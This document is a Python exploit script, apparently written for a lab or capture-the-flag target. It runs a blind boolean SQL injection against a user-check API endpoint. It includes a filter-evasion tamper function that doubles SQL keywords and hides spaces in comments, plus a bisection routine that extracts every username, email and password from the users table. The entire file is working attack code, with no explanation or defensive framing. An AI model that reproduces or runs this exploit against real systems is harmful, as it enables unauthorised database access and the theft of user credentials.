#!/usr/bin/python3

import requests
import json
import sys
from urllib.parse import quote_plus

# Proxy settings
proxy = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

# Enhanced tamper function to obfuscate payloads
def tamper(payload):
    if payload:
        replacements = {
            " ": "/*/**/*/",
            "AND": "AANDND",
            "and": "AANDND",
            "OR": "OORR",
            "or": "OORR",
            "LIMIT": "LLIMITIMIT",
            "limit": "LLIMITIMIT",
            "OFFSET": "OOFFSETFFSET",
            "offset": "OOFFSETFFSET",
            "WHERE": "WWHEREHERE",
            "where": "WWHEREHERE",
            "SELECT": "SSELECTELECT",
            "select": "SSELECTELECT",
            "UPDATE": "UUPDATEPDATE",
            "update": "UUPDATEPDATE",
            "DELETE": "DDELETEELETE",
            "delete": "DDELETEELETE",
            "DROP": "DDROPROP",
            "drop": "DDROPROP",
            "CREATE": "CCREATEREATE",
            "create": "CCREATEREATE",
            "INSERT": "IINSERTNSERT",
            "insert": "IINSERTNSERT",
            "FUNCTION": "FFUNCTIONUNCTION",
            "function": "FFUNCTIONUNCTION",
            "CAST": "CCASTAST",
            "cast": "CCASTAST",
            "ASCII": "AASCIISCII",
            "ascii": "AASCIISCII",
            "SUBSTRING": "SSUBSTRINGUBSTRING",
            "substring": "SSUBSTRINGUBSTRING",
            "VARCHAR": "VVARCHARARCHAR",
            "varchar": "VVARCHARARCHAR",
            "LENGTH": "LLENGTHENGTH",
            "length": "LLENGTHENGTH",
        }

        for key, value in replacements.items():
            payload = payload.replace(key, value)
    return payload

# Checks if query `q` evaluates as `true` or `false`
def oracle(q):
    query = f"admin' AND ({q}) -- -"
    tampered_query = quote_plus(tamper(query))
    r = requests.get(f"http://10.129.204.251:8080/api/v1/check-user?u={tampered_query}", proxies=proxy)
    j = json.loads(r.text)
    return j['exists']

# Function to get the length of a field
def get_field_length(field_name):
    length = 0
    while not oracle(f"LENGTH({field_name})={length}"):
        length += 1
    return length

# Function to dump a field (bisection logic)
def dump_field(field_name, length):
    result = ""
    for i in range(1, length + 1):
        low, high, found = 0, 127, False
        while low <= high:
            mid = (low + high) // 2
            if oracle(f"ASCII(SUBSTRING({field_name},{i},1)) BETWEEN {low} AND {mid}"):
                high, found = mid - 1, True
            else:
                low = mid + 1
        if not found:
            print("\n[!] No new character found, stopping.")
            break
        result += chr(low)
        print(chr(low), end='', flush=True)  # Print char found for column
    return result

# Function to dump all users' information
def dump_users_info():
    user_info = []
    i = 0
    while True:
        user_data = {}
        # Get username length
        username_length = get_field_length(f"(SELECT username FROM users ORDER BY id OFFSET {i} LIMIT 1)")
        if username_length == 0:
            break
        print(f"[+] Username: ", end='', flush=True)
        user_data['username'] = dump_field(f"(SELECT username FROM users ORDER BY id OFFSET {i} LIMIT 1)", username_length)
        
        # Get email length
        email_length = get_field_length(f"(SELECT email FROM users ORDER BY id OFFSET {i} LIMIT 1)")
        print(f"\n[+] Email: ", end='', flush=True)
        user_data['email'] = dump_field(f"(SELECT email FROM users ORDER BY id OFFSET {i} LIMIT 1)", email_length)
        
        # Get password length
        password_length = get_field_length(f"(SELECT password FROM users ORDER BY id OFFSET {i} LIMIT 1)")
        print(f"\n[+] Password: ", end='', flush=True)
        user_data['password'] = dump_field(f"(SELECT password FROM users ORDER BY id OFFSET {i} LIMIT 1)", password_length)
        
        user_info.append(user_data)
        print()
        i += 1
    return user_info

# Main function to coordinate the process
def main():
    user_info = dump_users_info()
    for info in user_info:
        print(f"Username: {info['username']}, Email: {info['email']}, Password: {info['password']}")

if __name__ == "__main__":
    main()
